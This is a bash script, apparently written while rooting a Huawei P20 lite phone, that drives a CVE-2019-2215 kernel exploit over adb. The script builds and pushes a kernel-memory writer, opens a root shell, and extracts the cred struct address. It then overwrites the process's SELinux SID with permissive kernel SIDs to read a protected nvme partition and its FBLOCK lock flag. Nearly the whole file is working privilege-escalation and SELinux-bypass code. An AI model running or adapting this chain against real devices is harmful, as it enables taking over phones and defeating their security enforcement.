#!/bin/bash
# Rewrite our own cred's SELinux SID from the root shell - no exploit rebuild.
#
# The exploit raises the thread's addr_limit and fork/exec keep both that limit
# and the cred struct, so a child process started from the root shell can read
# and write kernel memory with plain read()/write(). ksetuid uses that to point
# our SID at the initial kernel SID, which is the most permissive domain.
#
# Doing it out here matters: adding the same write inside the exploit costs the
# race (measured - rebuilt variants lose, the pristine binary wins).
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
CLANG="$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-clang"
IN=/tmp/kset.in
OUT=/tmp/kset.out

echo "############ build and push the tool"
"$CLANG" -O2 -Wall -o /tmp/ksetuid /home/placeless/dev/p20-root/ksetuid.c 2>&1 | tail -5
file /tmp/ksetuid | head -1
timeout 60 adb push /tmp/ksetuid /data/local/tmp/ksetuid 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/ksetuid'

echo
echo "############ start the root shell (minimal-delta build wins reliably)"
rm -f "$IN" "$OUT"; mkfifo "$IN"; : > "$OUT"
adb shell /data/local/tmp/cve-2019-2215 < "$IN" >> "$OUT" 2>&1 &
EXPPID=$!
exec 9> "$IN"
for i in $(seq 1 120); do
  grep -aq "capabilities are overwritten" "$OUT" 2>/dev/null && { echo "  root after ${i}s"; break; }
  sleep 1
done
grep -aq "capabilities are overwritten" "$OUT" || { echo ">>> no root"; tr -d '\000' < "$OUT" | tail -5; exit 1; }
sleep 3

CRED=$(tr -d '\000' < "$OUT" | grep -a "struct_cred is at:" | tail -1 | awk '{print $NF}')
echo "  cred address from the exploit: $CRED"

runroot() {
  local MARK="MK$RANDOM$RANDOM" b
  b=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$MARK" "$1" "$MARK" > "$IN"
  for i in $(seq 1 60); do
    sleep 1
    [ "$(tail -c +$((b+1)) "$OUT" | grep -ac "^$MARK$")" -ge 2 ] && break
  done
  tail -c +$((b+1)) "$OUT" | tr -d '\000' | awk -v m="$MARK" 'BEGIN{n=0}{if($0==m){n++;next} if(n==1)print}'
}

echo
echo "############ can the child really touch kernel memory?"
runroot "/data/local/tmp/ksetuid $CRED 1"

echo
echo "############ did that change anything for the shell?"
runroot 'cat /proc/self/attr/current; getenforce'

echo
echo "############ the goal: FBLOCK through the nvme partition"
runroot 'dd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1 | tail -1; /data/local/tmp/hisi-nve r FBLOCK 2>&1 | head -12'

echo
echo "############ if SID 1 did not help, try the other permissive initial SIDs"
for S in 7 3 2; do
  echo "---- SID $S"
  runroot "/data/local/tmp/ksetuid $CRED $S" | head -8
  runroot 'cat /proc/self/attr/current; dd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1 | tail -1'
done

echo
echo "### leaving the session open; kill this script to end"
while kill -0 "$EXPPID" 2>/dev/null; do sleep 5; done
echo "### exploit exited"
exec 9>&-
